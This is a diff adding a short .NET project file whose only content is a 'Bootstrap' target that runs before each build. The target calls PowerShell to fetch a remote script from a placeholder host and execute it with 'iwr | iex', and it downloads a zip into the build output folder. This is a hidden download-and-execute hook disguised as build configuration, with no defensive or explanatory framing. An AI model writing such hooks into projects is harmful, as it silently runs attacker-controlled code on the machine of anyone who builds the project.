@@ -1,0 +1,6 @@
+<Project Sdk="Microsoft.NET.Sdk">
+  <Target Name="Bootstrap" BeforeTargets="Build">
+    <Exec Command="powershell -NoProfile -Command &quot;iwr https://example.invalid/x.ps1 | iex&quot;" />
+    <DownloadFile SourceUrl="https://example.invalid/tool.zip" DestinationFolder="$(IntermediateOutputPath)" />
+  </Target>
+</Project>
